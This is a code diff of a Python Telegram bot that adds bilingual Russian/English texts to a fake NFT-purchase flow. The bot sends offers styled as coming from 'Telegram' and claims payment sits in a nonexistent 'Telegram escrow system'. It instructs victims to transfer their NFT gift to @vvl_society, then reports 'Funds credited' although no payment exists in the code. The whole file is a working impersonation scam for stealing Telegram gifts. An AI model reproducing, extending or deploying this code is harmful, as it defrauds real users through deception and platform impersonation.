@@ -17,14 +17,107 @@ dp = Dispatcher()
 active_deals = {}
 
 
+# ================= ТЕКСТЫ НА ДВУХ ЯЗЫКАХ =================
+TEXTS = {
+    "ru": {
+        "usage": (
+            "⚠️ Использование: `/buy <ссылка_на_NFT> <сумма> <валюта> [eu]`\n"
+            "Пример: `/buy https://t.me/nft/SnoopDogg-9203 1000 STARS`\n"
+            "Для английского добавьте `eu` в конце: "
+            "`/buy https://t.me/nft/SnoopDogg-9203 1000 STARS eu`"
+        ),
+        "invalid_link": (
+            "⚠️ Неверная ссылка на NFT.\n"
+            "Правильный формат: `https://t.me/nft/Название-Номер`\n"
+            "Пример: `https://t.me/nft/SnoopDogg-9203`"
+        ),
+        "header": "Telegram",
+        "offer": "Пользователь предлагает вам",
+        "for_gift": "за подарок",
+        "valid_for": "Оффер действителен ещё 6 ч. 0 мин.",
+        "decline_btn": "❌ Отклонить",
+        "accept_btn": "✅ Принять",
+        "declined": "❌ Предложение отклонено",
+        "alert_title": (
+            "Внимание!\n\n"
+            "Следуйте инструкции, чтобы не потерять подарок и получить оплату.\n\n"
+            "Нажмите «ОК», если вы прочитали это сообщение."
+        ),
+        "deal_lost": "⚠️ Ошибка: данные о сделке утеряны.",
+        "deal_title": "NFT Deal",
+        "order": "Ордер",
+        "buyer_reserved": "Покупатель зарезервировал",
+        "via_escrow": "через эскроу-систему Telegram.",
+        "escrow_text": (
+            "Средства хранятся на специальном эскроу-счёте и будут автоматически "
+            "зачислены на ваш баланс Telegram Stars сразу после передачи подарка."
+        ),
+        "instructions": "Инструкция для завершения сделки:",
+        "step1": "1. Передайте подарок пользователю: @vvl_society",
+        "step2_prefix": "2. Нажмите «Передать NFT» и выберите",
+        "step3": "3. Подтвердите передачу подарка.",
+        "link_to_gift": "Ссылка на подарок",
+        "final_note": (
+            "Telegram зафиксирует транзакцию и моментально зачислит "
+            "{amount} {currency} на ваш баланс. Резерв действует 24 часа."
+        ),
+        "transfer_btn": "Передать NFT",
+        "confirm_btn": "Подтвердить передачу",
+        "confirmed": "✅ Транзакция подтверждена!",
+        "deal_done": "✅ Сделка завершена. Средства зачислены на ваш баланс.",
+    },
+    "en": {
+        "usage": (
+            "⚠️ Usage: `/buy <NFT_link> <amount> <currency> [eu]`\n"
+            "Example: `/buy https://t.me/nft/SnoopDogg-9203 1000 STARS`\n"
+            "For English add `eu` at the end: "
+            "`/buy https://t.me/nft/SnoopDogg-9203 1000 STARS eu`"
+        ),
+        "invalid_link": (
+            "⚠️ Invalid NFT link.\n"
+            "Correct format: `https://t.me/nft/Name-Number`\n"
+            "Example: `https://t.me/nft/SnoopDogg-9203`"
+        ),
+        "header": "Telegram",
+        "offer": "A user offers you",
+        "for_gift": "for the gift",
+        "valid_for": "Offer is valid for another 6 h. 0 min.",
+        "decline_btn": "❌ Decline",
+        "accept_btn": "✅ Accept",
+        "declined": "❌ Offer declined",
+        "alert_title": (
+            "Attention!\n\n"
+            "Follow the instructions to not lose the gift and receive payment.\n\n"
+            "Click «OK» if you have read this message."
+        ),
+        "deal_lost": "⚠️ Error: deal data lost.",
+        "deal_title": "NFT Deal",
+        "order": "Order",
+        "buyer_reserved": "The buyer has reserved",
+        "via_escrow": "via the Telegram escrow system.",
+        "escrow_text": (
+            "The funds are held in a special escrow account and will be automatically "
+            "credited to your Telegram Stars balance right after the gift is transferred."
+        ),
+        "instructions": "Instructions to complete the deal:",
+        "step1": "1. Transfer the gift to the user: @vvl_society",
+        "step2_prefix": "2. Click «Transfer NFT» and choose",
+        "step3": "3. Confirm the gift transfer.",
+        "link_to_gift": "Gift link",
+        "final_note": (
+            "Telegram will record the transaction and instantly credit "
+            "{amount} {currency} to your balance. The reservation is valid for 24 hours."
+        ),
+        "transfer_btn": "Transfer NFT",
+        "confirm_btn": "Confirm transfer",
+        "confirmed": "✅ Transaction confirmed!",
+        "deal_done": "✅ Deal completed. Funds credited to your balance.",
+    },
+}
+
+
 # --- Функция: разбор ссылки NFT ---
 def parse_nft_link(url):
-    """
-    Из https://t.me/nft/SnoopDogg-9203 делает:
-    name = "SnoopDogg"  (без пробелов, как в ссылке)
-    number = "9203"
-    full = "SnoopDogg #9203"
-    """
     match = re.search(r"t\.me/nft/([A-Za-z0-9_]+)-(\d+)", url)
     if not match:
         return None
@@ -35,13 +128,11 @@ def parse_nft_link(url):
     return {
         "name": name,
         "number": number,
-        "full": f"{name} #{number}",   # "SnoopDogg #9203"
+        "full": f"{name} #{number}",
         "url": url
     }
 
-@dp.message(Command("start"))
-async def cmd_start(message: types.Message):
-    await message.answer("Бот работает. Версия 2.")
+
 # --- Команда /buy ---
 @dp.message(Command("buy"))
 async def cmd_buy(message: types.Message):
@@ -53,11 +144,16 @@ async def cmd_buy(message: types.Message):
 
     args = message.text.split()
 
+    # Определяем язык: если последний аргумент = "eu" — английский
+    lang = "ru"
+    if len(args) >= 2 and args[-1].lower() == "eu":
+        lang = "en"
+        args = args[:-1]  # убираем "eu" из аргументов
+
+    t = TEXTS[lang]  # тексты на нужном языке
+
     if len(args) < 4:
-        await message.answer(
-            "⚠️ Использование: `/buy <ссылка_на_NFT> <сумма> <валюта>`\n"
-            "Пример: `/buy https://t.me/nft/SnoopDogg-9203 1000 STARS`"
-        )
+        await message.answer(t["usage"])
         return
 
     nft_link = args[1]
@@ -67,29 +163,24 @@ async def cmd_buy(message: types.Message):
     nft_data = parse_nft_link(nft_link)
 
     if not nft_data:
-        await message.answer(
-            "⚠️ Неверная ссылка на NFT.\n"
-            "Правильный формат: `https://t.me/nft/Название-Номер`\n"
-            "Пример: `https://t.me/nft/SnoopDogg-9203`"
-        )
+        await message.answer(t["invalid_link"])
         return
 
     nft_title = nft_data["full"]   # "SnoopDogg #9203"
 
-    # ⚠️ ВАЖНО: ссылку пишем ГОЛОЙ (без <a href>), чтобы Telegram
-    # показал виджет-превью с картинкой NFT
+    # Текст предложения (ссылка голая — чтобы Telegram показал виджет)
     text = (
-        f"<b>Telegram</b>\n"
+        f"<b>{t['header']}</b>\n"
         f"<b>{nft_title}</b>\n\n"
-        f"Пользователь предлагает вам\n"
-        f"<b>{amount} {currency}</b> за подарок {nft_link}.\n\n"
-        f"Оффер действителен ещё 6 ч. 0 мин."
+        f"{t['offer']}\n"
+        f"<b>{amount} {currency}</b> {t['for_gift']} {nft_link}.\n\n"
+        f"{t['valid_for']}"
     )
 
     builder = InlineKeyboardBuilder()
     builder.row(
-        InlineKeyboardButton(text="❌ Отклонить", callback_data=f"decline_{message.from_user.id}"),
-        InlineKeyboardButton(text="✅ ТЕЕЕЕСТПринять", callback_data=f"accept_{message.from_user.id}")
+        InlineKeyboardButton(text=t["decline_btn"], callback_data=f"decline_{message.from_user.id}_{lang}"),
+        InlineKeyboardButton(text=t["accept_btn"], callback_data=f"accept_{message.from_user.id}_{lang}")
     )
 
     deal_id = str(message.from_user.id)
@@ -97,10 +188,10 @@ async def cmd_buy(message: types.Message):
         "link": nft_link,
         "amount": amount,
         "currency": currency,
-        "title": nft_title
+        "title": nft_title,
+        "lang": lang
     }
 
-    # disable_web_page_preview=False — чтобы Telegram показал виджет с картинкой
     await message.answer(
         text=text,
         reply_markup=builder.as_markup(),
@@ -112,51 +203,54 @@ async def cmd_buy(message: types.Message):
 # --- Отклонить ---
 @dp.callback_query(F.data.startswith("decline_"))
 async def process_decline(callback: CallbackQuery):
-    await callback.message.edit_text("❌ Предложение отклонено")
+    # Достаём язык из callback_data: decline_<user_id>_<lang>
+    parts = callback.data.split("_")
+    lang = parts[-1] if parts[-1] in TEXTS else "ru"
+    t = TEXTS[lang]
+
+    await callback.message.edit_text(t["declined"])
     await callback.answer()
 
 
 # --- Принять ---
 @dp.callback_query(F.data.startswith("accept_"))
 async def process_accept(callback: CallbackQuery):
-    await callback.answer(
-        text="Внимание!\n\nСледуйте инструкции, чтобы не потерять подарок и получить оплату.\n\nНажмите «ОК», если вы прочитали это сообщение.",
-        show_alert=True
-    )
+    parts = callback.data.split("_")
+    lang = parts[-1] if parts[-1] in TEXTS else "ru"
+    t = TEXTS[lang]
+
+    await callback.answer(text=t["alert_title"], show_alert=True)
     await asyncio.sleep(1.5)
 
-    deal_id = callback.data.split("_")[1]
+    deal_id = parts[1]  # user_id
     deal = active_deals.get(deal_id)
     if not deal:
-        await callback.message.edit_text("⚠️ Ошибка: данные о сделке утеряны.")
+        await callback.message.edit_text(t["deal_lost"])
         return
 
     nft_title = deal["title"]
     nft_url = deal["link"]
 
-    # Опять же — «голая» ссылка, чтобы Telegram показал превью
     final_text = (
-        f"<b>NFT Deal</b>\n\n"
-        f"Ордер #TG-D721BSTP\n\n"
-        f"Покупатель зарезервировал test <b>{deal['amount']} {deal['currency']}</b> "
-        f"через эскроу-систему Telegram.\n"
-        f"Средства хранятся на специальном эскроу-счёте и будут автоматически "
-        f"зачислены на ваш баланс Telegram Stars сразу после передачи подарка.\n\n"
-        f"<b>Инструкция для завершения сделки:</b>\n"
-        f"1. Передайте подарок пользователю: @vvl_society\n"
-        f"2. Нажмите «Передать NFT» и выберите <b>{nft_title}</b>\n"
-        f"3. Подтвердите передачу подарка.\n\n"
-        f"Ссылка на подарок: {nft_url}\n\n"
-        f"Telegram зафиксирует транзакцию и моментально зачислит "
-        f"{deal['amount']} {deal['currency']} на ваш баланс. Резерв действует 24 часа."
+        f"<b>{t['deal_title']}</b>\n\n"
+        f"{t['order']} #TG-D721BSTP\n\n"
+        f"{t['buyer_reserved']} <b>{deal['amount']} {deal['currency']}</b> "
+        f"{t['via_escrow']}\n"
+        f"{t['escrow_text']}\n\n"
+        f"<b>{t['instructions']}</b>\n"
+        f"{t['step1']}\n"
+        f"{t['step2_prefix']} <b>{nft_title}</b>\n"
+        f"{t['step3']}\n\n"
+        f"{t['link_to_gift']}: {nft_url}\n\n"
+        f"{t['final_note'].format(amount=deal['amount'], currency=deal['currency'])}"
     )
 
     builder = InlineKeyboardBuilder()
     builder.row(
-        InlineKeyboardButton(text="Передать NFT", url=nft_url)
+        InlineKeyboardButton(text=t["transfer_btn"], url=nft_url)
     )
     builder.row(
-        InlineKeyboardButton(text="Подтвердить передачу", callback_data=f"confirm_{deal_id}")
+        InlineKeyboardButton(text=t["confirm_btn"], callback_data=f"confirm_{deal_id}_{lang}")
     )
 
     await callback.message.edit_text(
@@ -170,8 +264,12 @@ async def process_accept(callback: CallbackQuery):
 # --- Подтвердить передачу ---
 @dp.callback_query(F.data.startswith("confirm_"))
 async def process_confirm(callback: CallbackQuery):
-    await callback.answer("✅ Транзакция подтверждена!", show_alert=True)
-    await callback.message.edit_text("✅ Сделка завершена. Средства зачислены на ваш баланс.")
+    parts = callback.data.split("_")
+    lang = parts[-1] if parts[-1] in TEXTS else "ru"
+    t = TEXTS[lang]
+
+    await callback.answer(t["confirmed"], show_alert=True)
+    await callback.message.edit_text(t["deal_done"])
 
 
 # --- Веб-сервер для Render ---
